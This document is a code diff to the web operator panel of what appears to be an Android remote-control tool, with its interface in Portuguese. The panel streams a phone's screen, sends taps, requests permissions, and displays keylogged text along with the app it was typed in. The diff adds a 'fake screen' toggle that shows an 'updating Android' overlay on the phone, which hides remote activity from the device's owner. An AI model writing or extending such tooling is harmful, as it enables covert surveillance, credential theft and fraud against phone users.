@@ -23,10 +23,11 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl.danger:hover i{color:#fc8181}
 .ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
 .ctrl.warn:hover{background:#2d1f0a;color:#fbd38d}
+.ctrl.purple{color:#9f7aea}.ctrl.purple i{color:#9f7aea}
+.ctrl.purple:hover{background:#1a1535;color:#d6bcfa}
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
 .device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,0.5);overflow:hidden}
 .screen{width:100%;height:100%;background:#000;cursor:crosshair;position:relative;overflow:hidden}
-/* A imagem ocupa exatamente o container — sem margens, sem object-fit contain */
 #stream-img{position:absolute;top:0;left:0;width:100%;height:100%;display:none;pointer-events:none}
 .screen-placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
 .screen-placeholder i{font-size:36px;display:block;margin-bottom:8px}
@@ -36,6 +37,10 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .nav-btn:hover{background:#2d3748;color:#fff}
 .nav-btn.warn{border-color:#ed8936;color:#ed8936}
 .nav-btn.warn:hover{background:#2d1f0a;color:#fbd38d}
+.nav-btn.purple{border-color:#9f7aea;color:#9f7aea}
+.nav-btn.purple:hover{background:#1a1535;color:#d6bcfa}
+.nav-btn.active-overlay{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 .nav-btn i{font-size:16px}
 .nav-btn span{font-size:9px}
 .msg-box{display:flex;gap:6px;width:100%}
@@ -113,6 +118,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <p class="sec-title">Controle</p>
         <button class="ctrl warn" onclick="solicitarCompartilhamento()"><i class="ti ti-screen-share"></i> Pedir tela</button>
         <button class="ctrl warn" onclick="send({tipo:'cmd',cmd:'pedir_permissoes'})"><i class="ti ti-shield-check"></i> Pedir permissões</button>
+        <button class="ctrl purple" id="btn-overlay-sidebar" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i> Tela falsa</button>
         <p class="sec-title">Sessão</p>
         <button class="ctrl danger" onclick="encerrar()"><i class="ti ti-plug-x"></i> Encerrar sessão</button>
       </div>
@@ -136,6 +142,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
           <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>Swipe ↓</span></button>
           <button class="nav-btn" onclick="toggleStream()"><i class="ti ti-player-play" id="stream-icon"></i><span id="stream-label">Stream</span></button>
           <button class="nav-btn warn" onclick="solicitarCompartilhamento()"><i class="ti ti-screen-share"></i><span>Pedir tela</span></button>
+          <button class="nav-btn purple" id="btn-overlay-nav" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span></button>
         </div>
 
         <div class="msg-box">
@@ -168,12 +175,13 @@ const SERVER = window.location.origin.replace(/^http/, 'ws');
 let ws = null, deviceAtual = null, streaming = false;
 let dispositivoLargura = 0, dispositivoAltura = 0;
 let abaAtual = 'log';
+let overlayAtivo = false;
 const VISOR_W = 260;
 
 function mudarAba(aba){
-  abaAtual = aba;
-  document.getElementById('painel-log').style.display = aba==='log'?'block':'none';
-  document.getElementById('painel-key').style.display = aba==='key'?'block':'none';
+  abaAtual=aba;
+  document.getElementById('painel-log').style.display=aba==='log'?'block':'none';
+  document.getElementById('painel-key').style.display=aba==='key'?'block':'none';
   document.getElementById('tab-log').className='tab'+(aba==='log'?' active':'');
   document.getElementById('tab-key').className='tab'+(aba==='key'?' active':'');
   if(aba==='key') document.getElementById('key-badge').style.display='none';
@@ -223,7 +231,7 @@ function conectarTecnico(){
         break;
       case 'stream_iniciado': iniciarStreamUI(); log('Stream ativo','ev'); break;
       case 'frame_tela': mostrarFrame(msg.frame); break;
-      case 'keylog': logKey(msg.texto, msg.app||'desconhecido'); break;
+      case 'keylog': logKey(msg.texto,msg.app||'desconhecido'); break;
       case 'cliente_desconectou': log('Cliente desconectou','err'); break;
     }
   };
@@ -266,6 +274,7 @@ function iniciarStreamUI(){
 }
 
 function voltarLista(){
+  if(overlayAtivo) toggleOverlay();
   deviceAtual=null; streaming=false;
   document.getElementById('tela-painel').style.display='none';
   document.getElementById('tela-clientes').style.display='flex';
@@ -284,22 +293,36 @@ function send(msg){
 function sendCmd(cmd){send({tipo:'cmd',cmd});log(`→ cmd ${cmd}`);}
 function solicitarCompartilhamento(){send({tipo:'cmd',cmd:'solicitar_tela'});log('→ Pedindo tela...','warn');}
 
+// Liga/desliga overlay de "Atualizando Android" no celular
+function toggleOverlay(){
+  overlayAtivo = !overlayAtivo;
+  send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
+
+  const btnNav = document.getElementById('btn-overlay-nav');
+  const btnSide = document.getElementById('btn-overlay-sidebar');
+  if(overlayAtivo){
+    btnNav.className='nav-btn active-overlay';
+    btnNav.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Remover tela</span>';
+    btnSide.className='ctrl purple';
+    btnSide.innerHTML='<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#fc8181"></i> Remover tela falsa';
+    log('→ Tela falsa ATIVADA no celular','warn');
+  } else {
+    btnNav.className='nav-btn purple';
+    btnNav.innerHTML='<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
+    btnSide.className='ctrl purple';
+    btnSide.innerHTML='<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#9f7aea"></i> Tela falsa';
+    log('→ Tela falsa REMOVIDA','ev');
+  }
+}
+
 function handleToque(e){
-  // Pega o rect do screen (container da imagem)
-  const screen = document.getElementById('screen');
-  const rect = screen.getBoundingClientRect();
-
-  // Posição do clique dentro do container
-  const clickX = e.clientX - rect.left;
-  const clickY = e.clientY - rect.top;
-
-  // Converte para porcentagem da tela do celular
-  // O container tem exatamente a proporção do celular, então é 1:1
-  const xPct = Math.max(0, Math.min(100, clickX / rect.width * 100));
-  const yPct = Math.max(0, Math.min(100, clickY / rect.height * 100));
-
-  log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
-  send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dispositivoLargura||1080, altura:dispositivoAltura||2340});
+  const screen=document.getElementById('screen');
+  const rect=screen.getBoundingClientRect();
+  const clickX=e.clientX-rect.left;
+  const clickY=e.clientY-rect.top;
+  const xPct=Math.max(0,Math.min(100,clickX/rect.width*100));
+  const yPct=Math.max(0,Math.min(100,clickY/rect.height*100));
+  send({tipo:'toque',x:+xPct.toFixed(4),y:+yPct.toFixed(4),largura:dispositivoLargura||1080,altura:dispositivoAltura||2340});
 }
 
 function enviarMensagem(){
@@ -335,8 +358,6 @@ function atualizarDispositivo(info){
     dispositivoLargura=parseInt(info.largura);
     dispositivoAltura=parseInt(info.altura);
     document.getElementById('d-res').textContent=`${dispositivoLargura}×${dispositivoAltura}`;
-
-    // Visor com proporção exata do celular — sem margens internas
     const ratio=dispositivoAltura/dispositivoLargura;
     const w=VISOR_W;
     const h=Math.round(w*ratio);
